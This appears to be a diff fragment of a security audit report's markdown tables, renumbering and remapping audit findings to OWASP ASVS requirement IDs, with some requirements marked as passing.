+| FINDING-014 | 10.5.4, 9.2.3 |
+| FINDING-015 | 6.3.4 |
+| FINDING-016 | 6.8.2 |
+| FINDING-017 | 6.8.4 |
+| FINDING-018 | 7.1.1 |
+| FINDING-019 | 7.3.1 |
+| FINDING-020 | 7.3.2 |
+| FINDING-021 | 7.4.2 |
+| FINDING-022 | 7.4.4 |
+| FINDING-023 | 7.5.2 |
+| FINDING-024 | 7.5.3 |
+| FINDING-025 | 8.2.1, 8.3.1, 8.4.2, 6.3.4, 2.3.1 |
+| FINDING-026 | 8.2.2, 8.3.1 |
+| FINDING-027 | 8.4.1 |
+| FINDING-028 | 8.4.2 |
+| FINDING-029 | 1.2.1, 1.3.1, 1.2.2, 5.3.2, 5.4.2 |
+| FINDING-030 | 1.3.3, 2.2.1, 2.3.2, 16.5.3 |
+| FINDING-031 | 1.3.5 |
+| FINDING-032 | 2.2.1 |
+| FINDING-033 | 2.2.3 |
+| FINDING-034 | 3.2.1, 5.4.1 |
+| FINDING-035 | 3.2.2 |
+| FINDING-036 | 3.2.2 |
+| FINDING-037 | 3.3.1, 3.3.2 |
+| FINDING-038 | 3.4.1 |
+| FINDING-039 | 3.4.3, 3.4.7 |
+| FINDING-040 | 3.4.4, 13.4.7 |
+| FINDING-041 | 3.4.6 |
+| FINDING-042 | 3.5.2 |
+| FINDING-043 | 3.5.8 |
+| FINDING-044 | 3.7.4, 3.7.5 |
+| FINDING-045 | 3.7.5 |
+| FINDING-046 | 2.3.3 |
+| FINDING-047 | 2.3.3 |
+| FINDING-048 | 2.3.4 |
+| FINDING-049 | 12.1.1 |
+| FINDING-050 | 12.1.2 |
+| FINDING-051 | 12.2.1, 12.2.2, 12.3.1, 3.7.4 |
+| FINDING-052 | 13.3.1 |
+| FINDING-053 | 13.3.3 |
+| FINDING-054 | 13.3.3 |
+| FINDING-055 | 13.3.4 |
+| FINDING-056 | 14.2.2, 14.3.2, 14.2.5, 14.3.3 |
+| FINDING-057 | 15.1.1 |
+| FINDING-058 | 15.1.2 |
+| FINDING-059 | 15.1.3 |
+| FINDING-060 | 15.2.1 |
+| FINDING-061 | 16.1.1 |
+| FINDING-062 | 16.2.1 |
+| FINDING-063 | 16.2.1, 16.4.3 |
+| FINDING-064 | 16.2.5 |
+| FINDING-065 | 16.3.1 |
+| FINDING-066 | 16.3.3, 16.3.4 |
+| FINDING-067 | 16.3.3 |
+| FINDING-068 | 16.4.3 |
+| FINDING-069 | 16.5.2 |
+| FINDING-070 | 16.5.3 |
+| FINDING-071 | 16.5.4 |
+| FINDING-072 | 5.2.1 |
+| FINDING-073 | 5.2.2, 5.3.1, 1.3.3 |
+| FINDING-074 | 9.2.4 |
+| FINDING-075 | 11.1.1 |
+| FINDING-076 | 11.1.2 |
+| FINDING-077 | 11.1.3 |
+| FINDING-078 | 11.1.4, 15.1.1 |
+| FINDING-079 | 11.2.1, 11.2.4, 11.4.2, 11.4.4, 11.6.1, 15.2.1 |
+| FINDING-080 | 11.2.3, 11.5.1 |
+| FINDING-081 | 11.2.5 |
+| FINDING-082 | 11.3.2 |
+| FINDING-083 | 11.7.1 |
+| FINDING-084 | 10.1.1 |
+| FINDING-085 | 10.3.1 |
+| FINDING-086 | 10.3.3 |
+| FINDING-087 | 10.3.4 |
+| FINDING-088 | 10.3.5, 10.4.14 |
+| FINDING-089 | 10.4.10, 10.4.16 |
+| FINDING-090 | 10.4.13, 10.4.15 |
+| FINDING-091 | 10.4.5 |
+| FINDING-092 | 10.4.9, 6.1.1, 7.4.5, 14.3.1 |
+| FINDING-093 | 10.5.3 |
+| FINDING-094 | 6.1.1, 6.3.1 |
+| FINDING-095 | 6.1.3 |
+| FINDING-096 | 6.3.5 |
+| FINDING-097 | 6.3.7 |
+| FINDING-098 | 6.5.6 |
+| FINDING-099 | 6.8.1 |
+| FINDING-100 | 6.8.4 |
+| FINDING-101 | 7.1.2 |
+| FINDING-102 | 7.1.3 |
+| FINDING-103 | 7.2.4 |
+| FINDING-104 | 7.4.3 |
+| FINDING-105 | 7.5.1 |
+| FINDING-106 | 7.5.3 |
+| FINDING-107 | 7.6.1 |
+| FINDING-108 | 8.2.3 |
+| FINDING-109 | 8.2.4 |
+| FINDING-110 | 8.3.1, 2.3.1, 16.5.3 |
 | FINDING-111 | 8.3.2 |
 | FINDING-112 | 8.4.2 |
-| FINDING-113 | 8.2.4 |
-| FINDING-114 | 8.1.1, 8.1.2 |
-| FINDING-115 | 8.1.3 |
-| FINDING-116 | 8.1.4 |
-| FINDING-117 | 7.1.1, 7.3.1 |
-| FINDING-118 | 7.1.2 |
-| FINDING-119 | 7.1.3 |
-| FINDING-120 | 7.2.4 |
-| FINDING-121 | 7.4.3 |
-| FINDING-122 | 7.5.1 |
-| FINDING-123 | 7.5.3 |
-| FINDING-124 | 7.6.1 |
-| FINDING-125 | 7.6.2 |
-| FINDING-126 | 1.1.2 |
-| FINDING-127 | 3.2.2 |
-| FINDING-128 | 1.2.3 |
-| FINDING-129 | 3.2.2 |
-| FINDING-130 | 1.2.2, 1.3.1, 1.3.3 |
-| FINDING-131 | 1.1.1 |
-| FINDING-132 | 3.2.1 |
-| FINDING-133 | 3.2.1 |
-| FINDING-134 | 3.5.2 |
-| FINDING-135 | 3.5.7 |
-| FINDING-136 | 3.5.8 |
-| FINDING-137 | 3.5.8 |
-| FINDING-138 | 3.3.2 |
-| FINDING-139 | 3.4.2 |
-| FINDING-140 | 3.4.4 |
-| FINDING-141 | 3.4.5 |
+| FINDING-113 | 8.4.2 |
+| FINDING-114 | 8.1.1 |
+| FINDING-115 | 8.1.2 |
+| FINDING-116 | 8.1.3 |
+| FINDING-117 | 8.1.4 |
+| FINDING-118 | 1.1.2, 1.2.1, 16.4.1 |
+| FINDING-119 | 1.2.1 |
+| FINDING-120 | 1.1.1, 5.3.2 |
+| FINDING-121 | 1.3.11 |
+| FINDING-122 | 1.3.3, 2.2.1 |
+| FINDING-123 | 1.2.3 |
+| FINDING-124 | 2.1.1 |
+| FINDING-125 | 2.1.2 |
+| FINDING-126 | 2.1.2 |
+| FINDING-127 | 2.1.3 |
+| FINDING-128 | 2.2.1 |
+| FINDING-129 | 2.2.2 |
+| FINDING-130 | 2.2.3 |
+| FINDING-131 | 2.2.3 |
+| FINDING-132 | 3.1.1 |
+| FINDING-133 | 3.2.3 |
+| FINDING-134 | 3.3.3 |
+| FINDING-135 | 3.3.4 |
+| FINDING-136 | 3.4.2 |
+| FINDING-137 | 3.4.5, 3.7.5 |
+| FINDING-138 | 3.4.8 |
+| FINDING-139 | 3.5.2 |
+| FINDING-140 | 3.5.3 |
+| FINDING-141 | 3.6.1, 3.4.3 |
 | FINDING-142 | 3.7.2 |
 | FINDING-143 | 3.7.3 |
 | FINDING-144 | 3.7.5 |
-| FINDING-145 | 12.1.1 |
-| FINDING-146 | 12.1.4 |
-| FINDING-147 | 12.2.2 |
-| FINDING-148 | 12.3.2 |
-| FINDING-149 | 12.3.4 |
-| FINDING-150 | 2.1.1 |
-| FINDING-151 | 2.1.2 |
-| FINDING-152 | 2.1.3 |
-| FINDING-153 | 2.2.1, 2.3.2 |
-| FINDING-154 | 2.2.2 |
-| FINDING-155 | 2.2.3 |
-| FINDING-156 | 2.3.1 |
-| FINDING-157 | 2.3.3 |
-| FINDING-158 | 2.3.4 |
-| FINDING-159 | 2.3.5 |
-| FINDING-160 | 2.4.1 |
-| FINDING-161 | 2.4.2 |
-| FINDING-162 | 1.3.3 |
-| FINDING-163 | 1.3.11 |
-| FINDING-164 | 1.3.8 |
-| FINDING-165 | 5.1.1 |
-| FINDING-166 | 5.2.3 |
-| FINDING-167 | 5.2.4 |
-| FINDING-168 | 5.2.5 |
-| FINDING-169 | 5.3.2 |
-| FINDING-170 | 5.4.1, 5.4.2 |
-| FINDING-171 | 5.4.3 |
-| FINDING-172 | 4.1.3 |
-| FINDING-173 | 4.2.1 |
-| FINDING-174 | 16.1.1, 16.2.3 |
-| FINDING-175 | 16.2.1 |
-| FINDING-176 | 16.2.1 |
-| FINDING-177 | 16.2.2 |
-| FINDING-178 | 16.2.4 |
-| FINDING-179 | 16.2.5 |
-| FINDING-180 | 16.2.5 |
-| FINDING-181 | 16.3.1 |
-| FINDING-182 | 16.3.2 |
-| FINDING-183 | 16.3.3 |
-| FINDING-184 | 16.3.3 |
-| FINDING-185 | 16.3.4 |
-| FINDING-186 | 16.3.4 |
-| FINDING-187 | 16.4.1 |
-| FINDING-188 | 16.4.2 |
-| FINDING-189 | 16.4.2 |
-| FINDING-190 | 16.5.1 |
-| FINDING-191 | 16.5.2 |
-| FINDING-192 | 16.5.4 |
-| FINDING-193 | 13.1.1 |
-| FINDING-194 | 13.1.2 |
-| FINDING-195 | 13.1.3 |
-| FINDING-196 | 13.1.4 |
-| FINDING-197 | 13.2.2 |
-| FINDING-198 | 13.2.4 |
-| FINDING-199 | 13.2.5 |
-| FINDING-200 | 13.4.2 |
-| FINDING-201 | 13.4.2 |
-| FINDING-202 | 13.4.4 |
-| FINDING-203 | 13.4.6 |
-| FINDING-204 | 13.4.7 |
-| FINDING-205 | 13.4.7 |
-| FINDING-206 | 15.1.1 |
-| FINDING-207 | 15.1.4 |
-| FINDING-208 | 15.1.5 |
-| FINDING-209 | 15.2.2 |
-| FINDING-210 | 15.2.2 |
-| FINDING-211 | 15.2.3 |
-| FINDING-212 | 15.2.4 |
-| FINDING-213 | 15.2.5 |
-| FINDING-214 | 15.2.5 |
-| FINDING-215 | 15.3.1 |
-| FINDING-216 | 15.3.3 |
-| FINDING-217 | 15.3.5 |
-| FINDING-218 | 15.4.1 |
-| FINDING-219 | 15.4.2 |
-| FINDING-220 | 15.4.2 |
-| FINDING-221 | 15.4.3 |
-| FINDING-222 | 15.4.4 |
-| FINDING-223 | 15.4.4 |
-| FINDING-224 | 6.1.1 |
-| FINDING-225 | 6.1.3 |
-| FINDING-226 | 9.1.1 |
-| FINDING-227 | 9.1.2 |
-| FINDING-228 | 9.1.3 |
-| FINDING-229 | 9.2.1 |
-| FINDING-230 | 9.2.2 |
-| FINDING-231 | 9.2.3 |
-| FINDING-232 | 14.3.1 |
-| FINDING-233 | 14.3.3 |
-| FINDING-234 | 3.1.1 |
-| FINDING-235 | 11.1.1 |
-| FINDING-236 | 11.2.2, 11.3.4 |
-| FINDING-237 | 11.4.1 |
-| FINDING-238 | 11.4.4 |
-| FINDING-239 | 11.7.2 |
-| FINDING-240 | 11.7.2 |
-| FINDING-241 | 14.2.2 |
-| FINDING-242 | 14.2.4 |
-| FINDING-243 | 14.2.6 |
-| FINDING-244 | 10.1.1 |
-| FINDING-245 | 10.1.2, 10.5.1 |
-| FINDING-246 | 10.2.3, 10.4.11 |
-| FINDING-247 | 10.4.11 |
-| FINDING-248 | 10.3.1 |
-| FINDING-249 | 10.4.1 |
-| FINDING-250 | 10.4.12 |
-| FINDING-251 | 10.4.2, 10.4.3 |
-| FINDING-252 | 10.4.9 |
-| FINDING-253 | 10.5.2 |
-| FINDING-254 | 6.8.4 |
-| FINDING-255 | 6.8.1 |
-| FINDING-256 | 6.3.8 |
-| FINDING-257 | 8.1.1 |
-| FINDING-258 | 8.3.2 |
-| FINDING-259 | 8.3.3 |
-| FINDING-260 | 7.4.4 |
-| FINDING-261 | 7.6.1 |
-| FINDING-262 | 7.6.2 |
-| FINDING-263 | 1.2.2 |
-| FINDING-264 | 3.2.3 |
-| FINDING-265 | 3.5.2 |
-| FINDING-266 | 3.5.4 |
-| FINDING-267 | 3.5.7 |
-| FINDING-268 | 3.3.5 |
-| FINDING-269 | 12.1.5 |
-| FINDING-270 | 12.3.1 |
-| FINDING-271 | 12.3.3 |
-| FINDING-272 | 12.3.5 |
-| FINDING-273 | 2.1.1 |
-| FINDING-274 | 2.3.5 |
-| FINDING-275 | 2.4.2 |
-| FINDING-276 | 1.3.12 |
-| FINDING-277 | 1.3.3 |
-| FINDING-278 | 1.3.7 |
-| FINDING-279 | 5.3.2 |
-| FINDING-280 | 5.4.2 |
-| FINDING-281 | 5.4.3 |
-| FINDING-282 | 4.1.4 |
-| FINDING-283 | 4.1.5 |
-| FINDING-284 | 16.2.2 |
-| FINDING-285 | 16.2.3, 16.4.2 |
-| FINDING-286 | 16.2.4 |
-| FINDING-287 | 16.3.4 |
-| FINDING-288 | 16.5.1 |
-| FINDING-289 | 13.2.1 |
-| FINDING-290 | 13.2.1 |
-| FINDING-291 | 13.2.2 |
-| FINDING-292 | 13.2.6 |
-| FINDING-293 | 13.4.1 |
-| FINDING-294 | 13.4.5 |
-| FINDING-295 | 13.4.6 |
-| FINDING-296 | 13.4.7 |
-| FINDING-297 | 15.2.5 |
-| FINDING-298 | 15.3.1 |
-| FINDING-299 | 15.3.3 |
-| FINDING-300 | 15.3.5 |
-| FINDING-301 | 15.3.6 |
-| FINDING-302 | 15.3.7 |
-| FINDING-303 | 6.1.1 |
-| FINDING-304 | 6.1.2 |
-| FINDING-305 | 6.3.1 |
-| FINDING-306 | 6.6.2 |
-| FINDING-307 | 6.7.1 |
-| FINDING-308 | 14.3.3 |
-| FINDING-309 | 1.5.2 |
-| FINDING-310 | 3.6.1 | ## ASVS → Finding Mapping
+| FINDING-145 | 2.3.1 |
+| FINDING-146 | 2.3.2 |
+| FINDING-147 | 2.3.3 |
+| FINDING-148 | 2.3.4 |
+| FINDING-149 | 2.3.5 |
+| FINDING-150 | 2.4.2 |
+| FINDING-151 | 12.1.1 |
+| FINDING-152 | 12.1.4 |
+| FINDING-153 | 12.2.2 |
+| FINDING-154 | 12.2.1 |
+| FINDING-155 | 12.3.2 |
+| FINDING-156 | 12.3.4 |
+| FINDING-157 | 13.1.1 |
+| FINDING-158 | 13.1.2 |
+| FINDING-159 | 13.1.3 |
+| FINDING-160 | 13.1.4 |
+| FINDING-161 | 13.2.2 |
+| FINDING-162 | 13.2.4 |
+| FINDING-163 | 13.2.6 |
+| FINDING-164 | 13.3.2 |
+| FINDING-165 | 13.3.4 |
+| FINDING-166 | 13.4.1 |
+| FINDING-167 | 13.4.2, 16.2.3, 16.5.1, 14.2.4 |
+| FINDING-168 | 13.4.6 |
+| FINDING-169 | 13.4.7 |
+| FINDING-170 | 14.1.1 |
+| FINDING-171 | 14.1.2 |
+| FINDING-172 | 14.2.4 |
+| FINDING-173 | 14.2.5 |
+| FINDING-174 | 14.2.6 |
+| FINDING-175 | 14.2.6 |
+| FINDING-176 | 14.3.1 |
+| FINDING-177 | 15.1.2 |
+| FINDING-178 | 15.1.4 |
+| FINDING-179 | 15.1.5 |
+| FINDING-180 | 15.2.3 |
+| FINDING-181 | 15.2.4 |
+| FINDING-182 | 15.3.3 |
+| FINDING-183 | 15.4.1, 15.4.3 |
+| FINDING-184 | 15.4.2 |
+| FINDING-185 | 16.1.1 |
+| FINDING-186 | 16.2.1 |
+| FINDING-187 | 16.2.1 |
+| FINDING-188 | 16.2.2 |
+| FINDING-189 | 16.2.4 |
+| FINDING-190 | 16.2.5 |
+| FINDING-191 | 16.2.5 |
+| FINDING-192 | 16.3.1 |
+| FINDING-193 | 16.3.3 |
+| FINDING-194 | 16.3.4 |
+| FINDING-195 | 16.3.4 |
+| FINDING-196 | 16.4.2 |
+| FINDING-197 | 16.4.2 |
+| FINDING-198 | 16.5.1 |
+| FINDING-199 | 16.5.2 |
+| FINDING-200 | 16.5.3 |
+| FINDING-201 | 16.5.4 |
+| FINDING-202 | 4.1.3 |
+| FINDING-203 | 4.2.1 |
+| FINDING-204 | 5.1.1 |
+| FINDING-205 | 5.2.3 |
+| FINDING-206 | 5.2.4 |
+| FINDING-207 | 5.2.5 |
+| FINDING-208 | 5.4.2 |
+| FINDING-209 | 5.4.3 |
+| FINDING-210 | 9.1.1 |
+| FINDING-211 | 9.1.2 |
+| FINDING-212 | 9.1.3 |
+| FINDING-213 | 9.2.1 |
+| FINDING-214 | 9.2.2 |
+| FINDING-215 | 9.2.4 |
+
+## ASVS → Finding Mapping
 
 | ASVS ID | Related Findings |
 |---------|------------------|
-| **1.1.1** | FINDING-131 |
-| **1.1.2** | FINDING-032, FINDING-126 |
-| **1.2.1** | FINDING-030, FINDING-031 |
-| **1.2.2** | FINDING-130, FINDING-263 |
-| **1.2.3** | FINDING-128 |
-| **1.3.1** | FINDING-033, FINDING-130 |
-| **1.3.3** | FINDING-033, FINDING-130, FINDING-162, FINDING-277 |
-| **1.3.5** | FINDING-033 |
-| **1.3.7** | FINDING-278 |
-| **1.3.8** | FINDING-164 |
-| **1.3.10** | FINDING-060 |
-| **1.3.11** | FINDING-163 |
-| **1.3.12** | FINDING-276 |
-| **1.5.2** | FINDING-309 |
-| **2.1.1** | FINDING-150, FINDING-273 |
-| **2.1.2** | FINDING-151 |
-| **2.1.3** | FINDING-152 |
-| **2.2.1** | FINDING-044, FINDING-045, FINDING-153 |
-| **2.2.2** | FINDING-154 |
-| **2.2.3** | FINDING-020, FINDING-048, FINDING-155 |
-| **2.3.1** | FINDING-156 |
-| **2.3.2** | FINDING-153 |
-| **2.3.3** | FINDING-046, FINDING-047, FINDING-157 |
-| **2.3.4** | FINDING-074, FINDING-158 |
-| **2.3.5** | FINDING-159, FINDING-274 |
-| **2.4.1** | FINDING-076, FINDING-160 |
-| **2.4.2** | FINDING-076, FINDING-161, FINDING-275 |
-| **3.1.1** | FINDING-234 |
-| **3.2.1** | FINDING-035, FINDING-132, FINDING-133 |
-| **3.2.2** | FINDING-033, FINDING-034, FINDING-127, FINDING-129 |
-| **3.2.3** | FINDING-030, FINDING-264 |
-| **3.3.1** | FINDING-037 |
-| **3.3.2** | FINDING-037, FINDING-138 |
-| **3.3.3** | FINDING-037 |
-| **3.3.4** | FINDING-037 |
-| **3.3.5** | FINDING-268 |
-| **3.4.1** | |
-| **3.4.2** | FINDING-139 |
-| **3.4.3** | FINDING-038 |
-| **3.4.4** | FINDING-140 |
-| **3.4.5** | FINDING-141 |
-| **3.4.6** | FINDING-039 |
-| **3.4.7** | FINDING-038 |
-| **3.4.8** | FINDING-040 |
-| **3.5.1** | |
-| **3.5.2** | FINDING-134, FINDING-265 |
-| **3.5.3** | |
-| **3.5.4** | FINDING-266 |
-| **3.5.7** | FINDING-135, FINDING-267 |
-| **3.5.8** | FINDING-036, FINDING-136, FINDING-137 |
-| **3.6.1** | FINDING-310 |
-| **3.7.2** | FINDING-142 |
-| **3.7.3** | FINDING-143 |
-| **3.7.4** | |
-| **3.7.5** | FINDING-144 |
-| **4.1.3** | FINDING-172 |
-| **4.1.4** | FINDING-282 |
-| **4.1.5** | FINDING-283 |
-| **4.2.1** | FINDING-173 |
-| **5.1.1** | FINDING-165 |
-| **5.2.1** | FINDING-049 |
-| **5.2.2** | FINDING-050 |
-| **5.2.3** | FINDING-166 |
-| **5.2.4** | FINDING-167 |
-| **5.2.5** | FINDING-168 |
-| **5.3.1** | FINDING-050 |
-| **5.3.2** | FINDING-169, FINDING-279 |
-| **5.4.1** | FINDING-170 |
-| **5.4.2** | FINDING-170, FINDING-280 |
-| **5.4.3** | FINDING-171, FINDING-281 |
-| **6.1.1** | FINDING-224, FINDING-303 |
-| **6.1.2** | FINDING-304 |
-| **6.1.3** | FINDING-225 |
-| **6.3.1** | FINDING-076, FINDING-305 |
-| **6.3.3** | FINDING-104 |
-| **6.3.4** | FINDING-018, FINDING-019 |
-| **6.3.5** | FINDING-107 |
-| **6.3.7** | FINDING-106 |
-| **6.3.8** | FINDING-256 |
-| **6.5.6** | FINDING-024 |
-| **6.6.2** | FINDING-306 |
-| **6.7.1** | FINDING-307 |
-| **6.8.1** | FINDING-255 |
-| **6.8.2** | FINDING-105 |
-| **6.8.4** | FINDING-100, FINDING-254 |
-| **7.1.1** | FINDING-117 |
-| **7.1.2** | FINDING-118 |
-| **7.1.3** | FINDING-119 |
-| **7.2.3** | FINDING-085 |
-| **7.2.4** | FINDING-120 |
-| **7.3.1** | FINDING-117 |
-| **7.3.2** | FINDING-023 |
-| **7.4.1** | FINDING-024 |
-| **7.4.2** | FINDING-025 |
-| **7.4.3** | FINDING-121 |
-| **7.4.4** | FINDING-260 |
-| **7.4.5** | FINDING-026 |
-| **7.5.1** | FINDING-122 |
-| **7.5.2** | FINDING-027 |
-| **7.5.3** | FINDING-028, FINDING-123 |
-| **7.6.1** | FINDING-124, FINDING-261 |
-| **7.6.2** | FINDING-029, FINDING-125, FINDING-262 |
-| **8.1.1** | FINDING-114, FINDING-257 |
-| **8.1.2** | FINDING-114 |
-| **8.1.3** | FINDING-115 |
-| **8.1.4** | FINDING-116 |
-| **8.2.1** | FINDING-108 |
-| **8.2.2** | FINDING-020, FINDING-109 |
-| **8.2.3** | FINDING-021, FINDING-110 |
-| **8.2.4** | FINDING-113 |
-| **8.3.1** | FINDING-020 |
-| **8.3.2** | FINDING-111, FINDING-258 |
-| **8.3.3** | FINDING-259 |
-| **8.4.1** | FINDING-022 |
-| **8.4.2** | FINDING-021, FINDING-100, FINDING-112 |
-| **9.1.1** | FINDING-226 |
-| **9.1.2** | FINDING-227 |
-| **9.1.3** | FINDING-228 |
-| **9.2.1** | FINDING-229 |
-| **9.2.2** | FINDING-230 |
-| **9.2.3** | FINDING-231 |
-| **9.2.4** | FINDING-017, FINDING-077, FINDING-078 |
-| **10.1.1** | FINDING-244 |
-| **10.1.2** | FINDING-097, FINDING-245 |
-| **10.2.1** | FINDING-097 |
-| **10.2.3** | FINDING-246 |
-| **10.3.1** | FINDING-248 |
-| **10.3.2** | FINDING-098 |
-| **10.3.3** | FINDING-099 |
-| **10.3.4** | FINDING-100 |
-| **10.3.5** | FINDING-101 |
-| **10.4.1** | FINDING-249 |
-| **10.4.2** | FINDING-251 |
-| **10.4.3** | FINDING-251 |
-| **10.4.4** | FINDING-097 |
-| **10.4.6** | FINDING-097 |
-| **10.4.9** | FINDING-252 |
-| **10.4.10** | FINDING-016 |
-| **10.4.11** | FINDING-246, FINDING-247 |
-| **10.4.12** | FINDING-250 |
-| **10.4.13** | FINDING-102 |
-| **10.4.14** | FINDING-101 |
-| **10.4.15** | FINDING-102 |
-| **10.4.16** | FINDING-016 |
-| **10.5.1** | FINDING-103, FINDING-245 |
-| **10.5.2** | FINDING-253 |
-| **10.5.4** | FINDING-017 |
-| **11.1.1** | FINDING-080, FINDING-235 |
-| **11.1.2** | FINDING-081 |
-| **11.1.3** | FINDING-082 |
-| **11.1.4** | FINDING-083 |
-| **11.2.1** | FINDING-084 |
-| **11.2.2** | FINDING-010, FINDING-236 |
-| **11.2.3** | FINDING-085 |
-| **11.2.4** | FINDING-011, FINDING-084 |
-| **11.2.5** | FINDING-086 |
-| **11.3.2** | FINDING-087 |
-| **11.3.4** | FINDING-236 |
-| **11.4.1** | FINDING-237 |
-| **11.4.2** | FINDING-084 |
-| **11.4.4** | FINDING-084, FINDING-238 |
-| **11.5.1** | FINDING-085 |
-| **11.6.1** | FINDING-084 |
-| **11.7.1** | FINDING-091 |
-| **11.7.2** | FINDING-239, FINDING-240 |
-| **12.1.1** | FINDING-041, FINDING-145 |
-| **12.1.2** | FINDING-042 |
-| **12.1.4** | FINDING-146 |
-| **12.1.5** | FINDING-269 |
-| **12.2.1** | FINDING-043 |
-| **12.2.2** | FINDING-043, FINDING-147 |
-| **12.3.1** | FINDING-043, FINDING-270 |
-| **12.3.2** | FINDING-148 |
-| **12.3.3** | FINDING-271 |
-| **12.3.4** | FINDING-149 |
-| **12.3.5** | FINDING-272 |
-| **13.1.1** | FINDING-193 |
-| **13.1.2** | FINDING-194 |
-| **13.1.3** | FINDING-195 |
-| **13.1.4** | FINDING-196 |
-| **13.2.1** | FINDING-289, FINDING-290 |
-| **13.2.2** | FINDING-197, FINDING-291 |
-| **13.2.4** | FINDING-198 |
-| **13.2.5** | FINDING-199 |
-| **13.2.6** | FINDING-292 |
-| **13.3.1** | FINDING-012, FINDING-088 |
-| **13.3.2** | FINDING-013 |
-| **13.3.3** | FINDING-012, FINDING-089 |
-| **13.3.4** | FINDING-014, FINDING-090 |
-| **13.4.1** | FINDING-293 |
-| **13.4.2** | FINDING-065, FINDING-200, FINDING-201 |
-| **13.4.4** | FINDING-202 |
-| **13.4.5** | FINDING-294 |
-| **13.4.6** | FINDING-203, FINDING-295 |
-| **13.4.7** | FINDING-204, FINDING-205, FINDING-296 |
-| **14.1.1** | FINDING-092 |
-| **14.1.2** | FINDING-092 |
-| **14.2.2** | FINDING-241 |
-| **14.2.4** | FINDING-093, FINDING-094, FINDING-242 |
-| **14.2.6** | FINDING-243 |
-| **14.2.7** | FINDING-015, FINDING-095, FINDING-096 |
-| **14.3.1** | FINDING-232 |
-| **14.3.2** | FINDING-079 |
-| **14.3.3** | FINDING-233, FINDING-308 |
-| **15.1.1** | FINDING-066, FINDING-206 |
-| **15.1.2** | FINDING-067 |
-| **15.1.3** | FINDING-068 |
-| **15.1.4** | FINDING-207 |
-| **15.1.5** | FINDING-208 |
-| **15.2.1** | FINDING-069, FINDING-084 |
-| **15.2.2** | FINDING-070, FINDING-209, FINDING-210 |
-| **15.2.3** | FINDING-065, FINDING-211 |
-| **15.2.4** | FINDING-067, FINDING-071, FINDING-212 |
-| **15.2.5** | FINDING-213, FINDING-214, FINDING-297 |
-| **15.3.1** | FINDING-215, FINDING-298 |
-| **15.3.3** | FINDING-216, FINDING-299 |
-| **15.3.4** | FINDING-072 |
-| **15.3.5** | FINDING-217, FINDING-300 |
-| **15.3.6** | FINDING-301 |
-| **15.3.7** | FINDING-302 |
-| **15.4.1** | FINDING-073, FINDING-218 |
-| **15.4.2** | FINDING-047, FINDING-074, FINDING-219, FINDING-220 |
-| **15.4.3** | FINDING-075, FINDING-221 |
-| **15.4.4** | FINDING-076, FINDING-222, FINDING-223 |
-| **16.1.1** | FINDING-051, FINDING-174 |
-| **16.2.1** | FINDING-052, FINDING-053, FINDING-175, FINDING-176 |
-| **16.2.2** | FINDING-177, FINDING-284 |
-| **16.2.3** | FINDING-174, FINDING-285 |
-| **16.2.4** | FINDING-178, FINDING-286 |
-| **16.2.5** | FINDING-054, FINDING-179, FINDING-180 |
-| **16.3.1** | FINDING-055, FINDING-181 |
-| **16.3.2** | FINDING-056, FINDING-057, FINDING-182 |
-| **16.3.3** | FINDING-058, FINDING-059, FINDING-183, FINDING-184 |
-| **16.3.4** | FINDING-058, FINDING-185, FINDING-186, FINDING-287 |
-| **16.4.1** | FINDING-060, FINDING-187 |
-| **16.4.2** | FINDING-188, FINDING-189, FINDING-285 |
-| **16.4.3** | FINDING-053, FINDING-061 |
-| **16.5.1** | FINDING-190, FINDING-288 |
-| **16.5.2** | FINDING-062, FINDING-191 |
-| **16.5.3** | FINDING-046, FINDING-063 |
-| **16.5.4** | FINDING-064, FINDING-192 | ## 7. Level Coverage Analysis
+| 1.1.1 | FINDING-120 |
+| 1.1.2 | FINDING-118 |
+| 1.2.1 | FINDING-029, FINDING-118, FINDING-119 |
+| 1.2.2 | FINDING-029 |
+| 1.2.3 | FINDING-123 |
+| 1.2.4 | ✅ Pass |
+| 1.2.5 | ✅ Pass |
+| 1.2.6 | FINDING-286 |
+| 1.2.7 | ✅ Pass |
+| 1.2.8 | ✅ Pass |
+| 1.2.9 | ✅ Pass |
+| 1.2.10 | ✅ Pass |
+| 1.3.1 | FINDING-029 |
+| 1.3.2 | ✅ Pass |
+| 1.3.3 | FINDING-030, FINDING-073, FINDING-122 |
+| 1.3.4 | FINDING-241 |
+| 1.3.5 | FINDING-031 |
+| 1.3.6 | ✅ Pass |
+| 1.3.7 | ✅ Pass |
+| 1.3.10 | FINDING-240, ✅ Pass |
+| 1.3.11 | FINDING-121 |
+| 1.3.12 | ✅ Pass |
+| 1.4.1 | ✅ Pass |
+| 1.4.2 | ✅ Pass |
+| 1.4.3 | ✅ Pass |
+| 1.5.1 | ✅ Pass |
+| 1.5.2 | FINDING-242 |
+| 1.5.3 | ✅ Pass |
+| 2.1.1 | FINDING-124, FINDING-243 |
+| 2.1.2 | FINDING-125, FINDING-126 |
+| 2.1.3 | FINDING-127 |
+| 2.2.1 | FINDING-030, FINDING-032, FINDING-122, FINDING-128 |
+| 2.2.2 | FINDING-129 |
+| 2.2.3 | FINDING-033, FINDING-130, FINDING-131 |
+| 2.3.1 | FINDING-025, FINDING-110, FINDING-145 |
+| 2.3.2 | FINDING-011, FINDING-030, FINDING-146 |
+| 2.3.3 | FINDING-046, FINDING-047, FINDING-147 |
+| 2.3.4 | FINDING-048, FINDING-148 |
+| 2.3.5 | FINDING-149, FINDING-251 |
+| 2.4.1 | |
+| 2.4.2 | FINDING-150, FINDING-252 |
+| 3.1.1 | FINDING-132, FINDING-244 |
+| 3.2.1 | FINDING-034 |
+| 3.2.2 | FINDING-035, FINDING-036 |
+| 3.2.3 | FINDING-133, FINDING-245 |
+| 3.3.1 | FINDING-037 |
+| 3.3.2 | FINDING-037 |
+| 3.3.3 | FINDING-134 |
+| 3.3.4 | FINDING-135, FINDING-246 |
+| 3.3.5 | FINDING-247 |
+| 3.4.1 | FINDING-038 |
+| 3.4.2 | FINDING-136 |
+| 3.4.3 | FINDING-039, FINDING-141 |
+| 3.4.4 | FINDING-040 |
+| 3.4.5 | FINDING-137 |
+| 3.4.6 | FINDING-041 |
+| 3.4.7 | FINDING-039 |
+| 3.4.8 | FINDING-138 |
+| 3.5.1 | |
+| 3.5.2 | FINDING-042, FINDING-139 |
+| 3.5.3 | FINDING-140 |
+| 3.5.4 | FINDING-248 |
+| 3.5.5 | ✅ Pass |
+| 3.5.6 | ✅ Pass |
+| 3.5.7 | FINDING-249, ✅ Pass |
+| 3.5.8 | FINDING-043 |
+| 3.6.1 | FINDING-141, FINDING-250 |
+| 3.7.1 | ✅ Pass |
+| 3.7.2 | FINDING-142 |
+| 3.7.3 | FINDING-143 |
